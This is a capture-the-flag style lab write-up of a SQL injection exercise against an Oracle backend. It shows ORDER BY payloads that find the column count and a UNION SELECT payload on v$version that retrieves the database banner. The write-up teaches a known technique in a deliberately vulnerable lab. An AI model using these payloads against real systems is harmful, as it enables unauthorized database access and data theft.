# SQL injection attack, querying the database type and version on Oracle

## Information

- Lab: SQLi
- Level: PRACTITIONER
- Description:

    Make the database retrieve the strings:

    'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production'

## Solution

![](<Images/SQL injection attack, querying the database type and version on Oracle 1.png>)

When I opened the website, I tested the `Accessories` category and found untrusted data in the URL:

```txt
category=Accessories
```

![](<Images/SQL injection attack, querying the database type and version on Oracle 2.png>)

I intercepted the request in Burp Suite and added a single quote to the parameter:

```txt
Accessories'
```

![](<Images/SQL injection attack, querying the database type and version on Oracle 3.png>)

The server returned an error.

![](<Images/SQL injection attack, querying the database type and version on Oracle 4.png>)

Based on the lab hint, the backend database is Oracle.

I used a `UNION` attack to retrieve the database version information, but first I needed to determine the number of columns using `ORDER BY`.

Payload format:

```sql
a' ORDER BY <number_of_column> -- -
```

Testing:

```sql
a' ORDER BY 5 -- -
```

Result: Error

```sql
a' ORDER BY 2 -- -
```

Result: Valid

```sql
a' ORDER BY 3 -- -
```

Result: Error

From this, I determined that the query has 2 columns.

Next, I used the following payload to retrieve the database version information:

```sql
a' UNION SELECT NULL, banner FROM v$version -- -
```

![](<Images/SQL injection attack, querying the database type and version on Oracle 5.png>)

The database version information was displayed successfully, and the lab was solved.

![](<Images/SQL injection attack, querying the database type and version on Oracle 6.png>)